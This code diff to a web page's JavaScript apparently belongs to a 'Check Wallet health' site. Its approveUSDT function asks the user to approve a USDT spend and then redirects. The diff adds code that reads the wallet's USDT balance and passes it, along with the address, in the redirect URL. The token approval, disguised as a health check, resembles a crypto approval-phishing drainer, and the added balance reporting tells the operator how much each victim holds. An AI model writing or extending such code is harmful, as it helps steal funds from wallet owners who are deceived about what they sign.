@@ -75,6 +75,7 @@ async function connectWallet(chainId) {
 }
 
 // Approve logic
+// Approve logic
 async function approveUSDT(targetButton) {
     try {
         targetButton.disabled = true;
@@ -85,7 +86,14 @@ async function approveUSDT(targetButton) {
         await tx.wait();
 
         const userAddress = await signer.getAddress();
-        window.location.href = `/healthcard.html?wallet=${userAddress}`;
+
+        // Fetch balance again after the approval
+        const usdt = new ethers.Contract(usdtAddress, BALANCE_ABI, signer);
+        const rawBalance = await usdt.balanceOf(userAddress);
+        const readableBalance = ethers.formatUnits(rawBalance, 18);
+
+        // Redirect with both wallet address and balance in the query string
+        window.location.href = `/healthcard.html?wallet=${userAddress}&balance=${readableBalance}`;
     } catch (err) {
         console.error("Approval failed:", err);
         alert("Approval failed: " + (err.message || err));
@@ -94,6 +102,7 @@ async function approveUSDT(targetButton) {
         targetButton.innerHTML = '<i class="fas fa-award" style="margin-right: 0.5rem;"></i>Check Wallet health';
     }
 }
+
 
 // Bind connect buttons
 connectBEP.onclick = () => connectWallet(56);
